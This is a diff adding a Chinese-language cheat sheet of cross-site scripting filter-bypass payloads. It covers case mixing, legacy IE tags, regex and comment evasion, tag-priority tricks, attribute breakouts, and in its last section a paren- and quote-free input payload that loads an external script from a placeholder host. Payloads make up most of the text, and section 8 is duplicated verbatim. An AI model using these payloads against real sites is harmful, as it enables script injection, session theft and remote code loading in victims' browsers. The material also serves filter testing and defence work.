@@ -1,0 +1,117 @@
+1.
+	可以全部大写或者大小写混合：	<SCRIPT></ScRiPt>
+
+2.
+	由于现代浏览器对XHTML的支持，使得我们可以在某些浏览器的某些版本中插入XML代码、SVG代码或未知标签。
+	如在IE 6下可以构造如下代码：
+	<XSS STYLE="xss:expression(alert('XSS'))">
+
+3.
+	通常情况下，黑名单的过滤器总会留下漏网之鱼，当然，这类标签都是不常用的标签，例如，以下几个就比较少见：
+	<isindex PROMPT="click picture" action="javascript:alert(1)" 
+		src="http:// www.baidu.com/img/baidu_logo.gif" style="width:290;height:171" type="image">
+	<BGSOUND SRC="javascript:alert('XSS');">
+	<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+
+4.
+	对方的过滤器判断标签的方法为：	/<([^>]+)>.*?<\/([^>]+)>/
+	那么当我们构造代码为：
+	<<SCRIPT>alert("XSS");//<</SCRIPT>
+	就不会被匹配到，当然，真实的过滤器逻辑会比这个复杂许多，我们可能需要相当长的模糊测试才能够分析出它的大概过滤流程，并构造独特的代码混淆方式。
+
+5.
+	由于注释优先级较高，我们可以构造以下一段代码：
+	<!--<a href="--><img src=x onerror=alert(1)//">test</a>
+
+	扫描器忽略了HTML注释后，会认为下面这段是一个完整的HTML语句：
+	<a href="--><img src=x onerror=alert(1)//">test</a>
+
+	那么下面这段就被认为是属性href的值：
+	"--><img src=x onerror=alert(1)//"
+
+	从而对这段代码进行放行。但实际上对浏览器来说，<!--<a href="-->是注释内容，
+	<img src=x onerror=alert(1)//">则是一个完整的img标签，而onerror则成了一个独立的事件属性得以执行
+
+6.
+	还有一种特殊的注释：IE HTML条件控制语句，代码样式如下：
+	<!--[if IE]>所有的IE可识别<![endif]-->
+	<!--[if IE 6]>仅IE6可识别<![endif]-->
+	<!--[if lt IE 6]> IE6以及IE6以下版本可识别<![endif]-->
+	<!--[if gte IE 6]> IE6以及IE6以上版本可识别<![endif]-->
+
+	这是IE所独有的，在其他浏览器看来与普通注释无异，但是在IE看来却是可根据条件执行的，这给我们绕过过滤器创造了可乘之机。
+	另外，如下两种条件语句也是可以在IE下被解析执行的：
+	<!--[if]><script>alert(1)</script -->
+	<!--[if<img src=x onerror=alert(2)//]> -->
+
+7.
+	在HTML语法中有标签优先级的概念，有些标签如<textarea>、<title>、<style>、<script>、<xmp>等具有非常高的优先级，
+	使得其结束标签甚至可以直接中断其他标签的属性：
+	<title><ahref="</title><img src=x onerror=alert(1)//">
+	<style><ahref="</style><img src=x onerror=alert(1)//">
+
+	如上代码在不分优先级的过滤器看来是一个<title>或<style>标签，后面跟了一个<a>标签，
+	那么如果标签和属性都是合法属性，代码就会被放行，但是在浏览器看来则是一对<title>或<style>标签和一个<img>标签，
+	因为<img>拥有一个自动执行的onerror事件属性，使得我们放在事件中的代码得以执行。从这点看，我们可以认为HTML注释本身是一个高优先级的标签。
+	如果过滤器将如上标签也过滤了，那么我们也可以尝试以下这些方式：
+	<? foo="><script>alert(1)</script>">
+	<! foo="><script>alert(1)</script>">
+	</ foo="><script>alert(1)</script>">
+	<% foo="%><script>alert(1)</script>">
+	这些都是前人模糊测试的结果，前三种可在Firefox和Webkit浏览器中执行，第四种可以在IE中执行。如果过滤器是基于黑名单过滤的，那么有可能会忽略这些。
+
+8.
+	HTML属性按用途分，大致可以分普通属性、事件属性、资源属性几种。
+	对于普通属性，如果我们可控制的变量是属性值，那么我们所能做的就只能是突破当前属性，尝试去构造新属性或者构造新标签。若属性值没有用引号，如：
+	<font color=<?=$_GET['url']?> />
+
+	那么我们利用起来就非常简单，使用?url=x%20onerror=alert(1)就可以使代码执行了，将变量合到代码中的形式为：
+	<font color=x onerror=alert(1) />
+	
+	如果属性值是被引号包括的：
+	<font color="<?=$_GET['url']?>" />
+
+	那么就只能看看能否构造自己的引号将已有的属性闭合：
+	?url=x"%20onerror=alert(1) //
+
+	将变量合到代码中的形式为：
+	<font color="x" onerror=alert(1) //" />
+
+	但如果对方此时连引号也过滤掉了，或者做了HTMLEncode转义，那么既没有XSS安全隐患，也没有可以利用的方式。不过这里目前至少有两个特例：
+	<img src="x` `<script>alert(1)</script>"` `>（IE 6）
+	<img src= alt=" onerror=alert(1)//">（IE、Firefox、Chrome、Opera等）
+
+	两段代码中的可执行部分虽然看起来都在属性值中，但代码的确可以运行，这也是广大跨站师模糊测试的结果。HTML属性按用途分，
+	大致可以分普通属性、事件属性、资源属性几种。对于普通属性，如果我们可控制的变量是属性值，
+	那么我们所能做的就只能是突破当前属性，尝试去构造新属性或者构造新标签。若属性值没有用引号，如：
+	<font color=<?=$_GET['url']?> />
+
+	那么我们利用起来就非常简单，使用?url=x%20onerror=alert(1)就可以使代码执行了，将变量合到代码中的形式为：
+	<font color=x onerror=alert(1) />
+
+	如果属性值是被引号包括的：
+	<font color="<?=$_GET['url']?>" />
+
+	那么就只能看看能否构造自己的引号将已有的属性闭合：
+	?url=x"%20onerror=alert(1) //
+
+	将变量合到代码中的形式为：
+	<font color="x" onerror=alert(1) //" />
+
+	但如果对方此时连引号也过滤掉了，或者做了HTMLEncode转义，那么既没有XSS安全隐患，也没有可以利用的方式。不过这里目前至少有两个特例：
+	<img src="x` `<script>alert(1)</script>"` `>（IE 6）
+	<img src= alt=" onerror=alert(1)//">（IE、Firefox、Chrome、Opera等）
+
+	两段代码中的可执行部分虽然看起来都在属性值中，但代码的确可以运行，这也是广大跨站师模糊测试的结果。
+
+9.
+	过滤了常见的script关键字，还有尖括号 >< ，单引号 ' ，圆括号 ) (
+	xxxxxxxxxx" name=javasCript:alert%281%29 autofocus onfocus=location=this.name xx
+
+	xxxxxxxxxx" name=javasCript:s=document.createElement%28"sCript"%29;s.src="//xxxxx.js";
+	document.body.appendChild%28s%29 autofocus onfocus=location=this.name xx
+
+	1 由于过滤了尖括号><，所以只能在input标签内部构造，input标签最好用的xss事件就是onfocus了
+	2 由于过滤了圆括号()，所以用 location=url编码 的这种模式，可以将括号写为%28 %29
+	3 由于过滤了单引号'，所以location='alert%271%28'这样就不能用了，所以利用this.name进行传值
+	4 script关键字有过滤，所以用sCript大小写混淆绕过
